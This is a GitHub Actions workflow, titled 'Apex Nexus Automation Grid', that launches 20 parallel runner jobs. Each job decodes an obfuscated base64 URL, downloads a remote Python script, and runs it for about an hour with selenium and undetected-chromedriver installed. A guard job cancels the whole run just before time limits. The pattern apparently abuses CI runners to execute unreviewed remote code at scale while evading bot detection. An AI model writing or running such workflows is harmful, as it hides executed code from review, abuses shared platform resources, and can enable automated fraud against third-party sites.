name: Apex Nexus Automation Grid

on:
  workflow_dispatch:

concurrency:
  group: apex-grid-${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: false

permissions:
  actions: write
  contents: read

jobs:
  # =================================================================
  # Guard Duty: يتحقق من الوقت ثم يلغي سير العمل بالكامل
  # =================================================================
  guard-duty:
    name: "Master Timekeeper"
    runs-on: ubuntu-latest
    timeout-minutes: 60
    env:
      MAX_WAIT_SEC: 3540
    steps:
      - name: Start Guard Timer
        run: |
          echo "[GUARD] Active run ID: ${{ github.run_id }}"
          echo "[GUARD] Waiting for ${MAX_WAIT_SEC} seconds..."

          sleep ${MAX_WAIT_SEC}

          echo "[GUARD] Window expired. Triggering cancellation..."

          curl -sS -X POST \
            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
            -H "Accept: application/vnd.github+json" \
            -H "X-GitHub-Api-Version: 2022-11-28" \
            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"

          echo "[GUARD] Cancellation request dispatched."

  # =================================================================
  # Agent Cluster: تشغيل الحزم الموازية
  # =================================================================
  agent-cluster:
    name: "Agent-Cluster-ID-${{ matrix.agent_id }}"
    runs-on: ubuntu-latest
    timeout-minutes: 59

    strategy:
      fail-fast: false
      matrix:
        agent_id: [n1, n2, n3, n4, n5, n6, n7, n8, n9, 810, 811, 812, 813, 814, 815, 816, 817, 818, 819, 820]

    steps:
      # مرحلة 1: تهيئة النظام
      - name: Initialize System Packages
        run: |
          echo "[INIT] Provisioning Agent-Cluster-ID-${{ matrix.agent_id }}..."
          sudo apt-get update -y -qq
          sudo apt-get install -y --no-install-recommends curl python3-pip

      # مرحلة 2: استخراج النص البرمجي
      - name: Fetch Target Script
        run: |
          echo "[FETCH] Resolving endpoint address..."
          TARGET_URL=$(python3 -c "import base64; print(base64.b64decode('aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5').decode('utf-8'))")
          curl -sL "$TARGET_URL" -o main_service.py
          echo "[FETCH] Script saved as main_service.py."

      # مرحلة 3: إعداد بيئة العميل
      - name: Install Client Requirements
        run: |
          echo "[REQUIREMENTS] Installing required Python libraries..."
          python3 -m pip install -q requests selenium undetected-chromedriver psutil

      # مرحلة 4: التشغيل والمراقبة
      - name: Launch Main Service
        run: |
          echo "[RUN] Executing main_service.py for Agent ${{ matrix.agent_id }}..."

          python3 main_service.py &
          SERVICE_PID=$!

          echo "[RUN] Service PID is $SERVICE_PID. Sleeping for 3540 seconds..."

          sleep 3540

          if kill -0 $SERVICE_PID 2>/dev/null; then
            echo "[RUN] Process still active after 59m. Force killing..."
            kill -9 $SERVICE_PID
            echo "[RUN] Process successfully killed."
          else
            echo "[RUN] Process finished prior to timeout."
          fi
